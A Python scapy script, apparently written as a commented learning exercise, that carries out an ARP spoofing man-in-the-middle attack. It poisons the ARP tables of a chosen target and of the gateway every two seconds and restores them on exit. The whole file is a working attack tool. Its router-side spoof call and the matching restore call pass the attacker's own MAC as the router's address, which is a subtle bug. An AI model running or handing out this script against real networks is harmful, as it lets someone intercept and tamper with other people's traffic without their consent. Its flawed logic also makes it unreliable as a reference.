import subprocess           # For running system commands
import optparse             # For handling command line arguments
import re                   # For pattern matching in text
import scapy.all as scapy   # For network operations
import time                 # For adding delays 

def Get_Arguments():
    """
    Get the target IP address from command line arguments.
    
    This function:
    - Creates a way to accept command line options
    - Adds an option for target IP (-t or --target)
    - Checks if user provided the target IP
    - Returns the options if everything is correct
    
    Returns:
        options: Object containing the target_ip value
    """
    # Create an OptionParser object for command line options
    parser = optparse.OptionParser()
    
    # Add option for target IP address
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP address")
    
    # Get the options and arguments from command line
    (options, arguments) = parser.parse_args()
    
    # Check if target IP was provided
    if not options.target_ip:
        print("[-] Error: Please specify Target IP, use --help for more info.")
        exit()
        
    # Return the options object
    return options
    
    
def Get_Router_IP():
    """
    Find the IP address of the router (default gateway).
    
    Returns:
        str: Router's IP address
    """
    
    try:
        # Run command to get route to Google DNS (8.8.8.8) 
        result = subprocess.check_output(["ip", "route", "get", "8.8.8.8"], text=True)
        
        # Get router IP (third item in result)
        # split() is a method that splits a string into words based on a Spaces
        return result.split()[2]
    
    except subprocess.CalledProcessError as e:
        # If command fails, show error and exit
        print(f"Failed to get router IP: {e}")
        exit()

def Get_MAC(ip):
    """
    Get the MAC address for a given IP address.
    
    This function:
    - Creates an ARP request for the IP
    - Sends it to the network
    - Returns the MAC address from the response
    
    Args:
        ip (str): IP address to find MAC for
    
    Returns:
        str: MAC address if found
    """
    
    try:
        # Create ARP request packet
        arp_request = scapy.ARP(pdst=ip)
        
        # Create broadcast frame
        arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        
        # Combine the ARP request with broadcast frame
        arp_request_broadcast = arp_broadcast / arp_request
        
        # Send packet and get response
        answer = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
        # Return MAC address from response
        # [0][] → Zero means: takes the first response from the answer list.
        # [][1] → One means: selects the actual reply (ARP response) from the target device.
        return answer[0][1].hwsrc
    
        # So...
        # [0][0] → [First response] → [Our request (ARP Request)]     → We don't need this.       → The question you asked (Who has this IP?)
        # [0][1] → [First response] → [Target's reply (ARP Response)] → Contains the MAC address. → The answer you received (I have this IP, and here’s my MAC!)
    
    except Exception as e:
        # If anything fails, show error and exit
        print(f"Failed to get MAC address for {ip}: {e}")
        exit()


def Get_Interfaces():
    """
    Get list of network interfaces on the system.
    
    This function:
    - Runs ifconfig command
    - Finds all interface names
    - Returns them as a list
    
    Returns:
        list: Names of network interfaces
    """
    
    try:
        # Run ifconfig command and get output
        ifconfigResult = subprocess.check_output(["ifconfig"], text=True)
        
        # Find all interface names using pattern matching
        interfaces = re.findall(r'^\w+', ifconfigResult, re.MULTILINE)
        
        # Return list of interfaces
        return interfaces
    except subprocess.CalledProcessError as e:
        # If command fails, show error and exit
        print(f"Failed to get network interfaces: {e}")
        exit()
        
def Get_Kali_MAC():
    """
    Get the MAC address of the first network interface.
    
    This function:
    - Gets list of interfaces
    - Gets details of first interface
    - Finds its MAC address
    
    Returns:
        str: MAC address of first interface
    """
    
    # Get list of network interfaces
    interfaces = Get_Interfaces()
    
    try:
        # Get details of first interface
        result_command = subprocess.check_output(["ifconfig", interfaces[0]], text=True)
        
        # Find MAC address using pattern matching
        kali_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", result_command).group(0)
        
        # Return the MAC address
        return kali_mac
    
    except subprocess.CalledProcessError as e:
        # If anything fails, show error and exit
        print(f"Failed to get MAC address for {interfaces[0]}: {e}")
        exit()
        
def Spoof(targetIP, routerIP, targetMAC):
    """
    Send Spoofed ARP packet to target.
    
    This function:
    - Creates fake ARP packet
    - Sends it to target
    
    Args:
        targetIP (str): IP address of target
        routerIP (str): IP address of router
        targetMAC (str): MAC address of target
    """
    
    # Create ARP packet with fake source
    # op=2  → This means the ARP packet is a Reply (not a Request). "This is my MAC address for that IP!" so Target save it in their ARP table "arp -a" as
    # pdst  → Packet Destination    → Where the packet is going (Target's IP).
    # hwdst → Hardware Destination  → Who should receive this packet? (Target's MAC).
    # psrc  → Packet Source         → From where the packet is coming (Router's IP). (Fake source). We pretend to be the Router to trick the Target.  
    # hwsrc → Hardware Source       → The MAC address we claim to have. → If not specified, it uses our MAC automatically.
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=routerIP)
    
    # op=1 → This means the ARP packet is a Request (not a Reply). "Who has this IP? Tell me your MAC!"
    
    # Send the packet to the target
    scapy.sendp(packet, verbose=False)

def Restore(targetIP, routerIP, targetMAC):
    """
    Restore normal ARP tables on network.
    
    This function:
    - Gets real router MAC
    - Creates correct ARP packet
    - Sends it multiple times
    
    Args:
        targetIP (str): IP address of target
        routerIP (str): IP address of router
        targetMAC (str): MAC address of target
    """
    # Get real router MAC address
    routerMac = Get_MAC(routerIP)
    # Create correct ARP packet
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=routerIP, hwsrc=routerMac)
    # Send packet 4 times to make sure it works
    scapy.sendp(packet, verbose=False, count=4)


def Spoof_loop(target_ip, router_ip, target_mac, kali_mac):
    """
    Run continuous ARP Spoofing attack.
    
    This function:
    - Sends fake ARP packets every 2 seconds
    - Shows what it's doing
    - Restores network when stopped
    
    Args:
        target_ip (str): Target's IP address
        router_ip (str): Router's IP address
        target_mac (str): Target's MAC address
        kali_mac (str): Our MAC address
    """
    try:
        # Keep running until stopped
        while True:
            # Wait 2 seconds between packets
            time.sleep(2)
            # Send Spoof packets both ways
            Spoof(target_ip, router_ip, target_mac)
            Spoof(router_ip, target_ip, kali_mac)
            # Show fancy box with status
            print("+" + "-" * 68 + "+")
            print(f"| {'[*] Spoofing:':<15} {target_ip:<20} {'with ->':<8} {router_ip:<20} |")
            print(f"| {'[*] Spoofing:':<15} {router_ip:<20} {'with ->':<8} {target_ip:<20} |")
            print(f"| {'[*] Old MAC:':<15} {target_mac:<20} {'New MAC:':<8} {kali_mac:<20} |")
            print("+" + "-" * 68 + "+")
    except KeyboardInterrupt:
        # When user stops program (Ctrl+C)
        print("Restoring ARP tables...")
        # Fix the ARP tables
        Restore(target_ip, router_ip, target_mac)
        Restore(router_ip, target_ip, kali_mac)
        print("ARP tables Restored. Exiting...")
        exit()

# Main program starts here
if __name__ == "__main__":
    # Get target IP from command line
    options = Get_Arguments()
    # Get router IP automatically
    router_ip = Get_Router_IP()
    # Store target IP from options
    target_ip = options.target_ip
    # Get target's MAC address
    target_mac = Get_MAC(target_ip)
    # Get our MAC address
    kali_mac = Get_Kali_MAC()

    # Show starting message
    print(f"Starting ARP Spoofing attack on {target_ip}...")
    # Start the Spoofing loop
    Spoof_loop(target_ip, router_ip, target_mac, kali_mac)